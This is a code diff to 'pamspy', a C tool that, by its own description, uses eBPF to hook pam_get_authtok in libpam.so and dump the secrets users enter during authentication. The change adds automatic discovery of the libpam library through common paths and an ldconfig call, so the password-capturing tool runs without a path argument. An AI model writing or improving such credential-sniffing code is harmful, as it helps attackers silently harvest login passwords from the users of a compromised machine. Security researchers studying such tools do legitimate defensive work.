@@ -10,6 +10,7 @@
 #include <fcntl.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <limits.h>
 #include "pamspy.skel.h"
 #include "pamspy_symbol.h"
 #include "pamspy_event.h"
@@ -32,7 +33,57 @@ const char argp_program_doc[] =
 "Uses eBPF to dump secrets use by PAM (Authentication) module\n"
 "By hooking the pam_get_authtok function in libpam.so\n"
 "\n"
-"USAGE: ./pamspy -p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4) -d /var/log/trace.0\n";
+"USAGE: ./pamspy [-p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4)] [-d /var/log/trace.0]\n"
+"       (path argument is optional - auto-discovery will be used if not provided)\n";
+
+/******************************************************************************/
+/*!
+ *  \brief  Auto-discover libpam.so path by checking common locations and ldconfig
+ */
+static char* auto_discover_libpam(void) {
+    const char *common_paths[] = {
+        "/lib/x86_64-linux-gnu/libpam.so.0",
+        "/lib/x86_64-linux-gnu/libpam.so",
+        "/usr/lib/x86_64-linux-gnu/libpam.so.0",
+        "/usr/lib/x86_64-linux-gnu/libpam.so",
+        "/lib64/libpam.so.0",
+        "/lib64/libpam.so",
+        "/usr/lib/libpam.so.0",
+        "/usr/lib/libpam.so",
+        "/lib/libpam.so.0",
+        "/lib/libpam.so",
+        NULL
+    };
+    
+    // Try common paths first
+    for (int i = 0; common_paths[i] != NULL; i++) {
+        if (access(common_paths[i], F_OK) == 0) {
+            return strdup(common_paths[i]);
+        }
+    }
+    
+    // Try using ldconfig if common paths failed
+    FILE *fp = popen("/sbin/ldconfig -p 2>/dev/null | grep libpam.so", "r");
+    if (fp != NULL) {
+        char line[PATH_MAX];
+        while (fgets(line, sizeof(line), fp) != NULL) {
+            // Format: "libpam.so.0 (libc6,x86-64) => /usr/lib/x86_64-linux-gnu/libpam.so.0"
+            char *path = strrchr(line, '>');
+            if (path != NULL) {
+                path += 2; // Skip "> "
+                // Remove newline
+                char *newline = strchr(path, '\n');
+                if (newline) *newline = '\0';
+                char *result = strdup(path);
+                pclose(fp);
+                return result;
+            }
+        }
+        pclose(fp);
+    }
+    
+    return NULL;
+}
 
 /******************************************************************************/
 /*!
@@ -237,8 +288,15 @@ int main(int argc, char **argv)
 
     if(env.libpam_path == NULL) 
     {
-        fprintf(stderr, "pamspy: argument PATH is mandatory\n");
-        exit(1);
+        // Try to auto-discover libpam.so
+        env.libpam_path = auto_discover_libpam();
+        if (env.libpam_path == NULL) {
+            fprintf(stderr, "pamspy: argument PATH is mandatory or libpam.so could not be auto-discovered\n");
+            exit(1);
+        }
+        if(env.verbose) {
+            fprintf(stderr, "pamspy: Auto-discovered libpam at: %s\n", env.libpam_path);
+        }
     }
 
     int offset = pamspy_find_symbol_address(env.libpam_path, "pam_get_authtok");
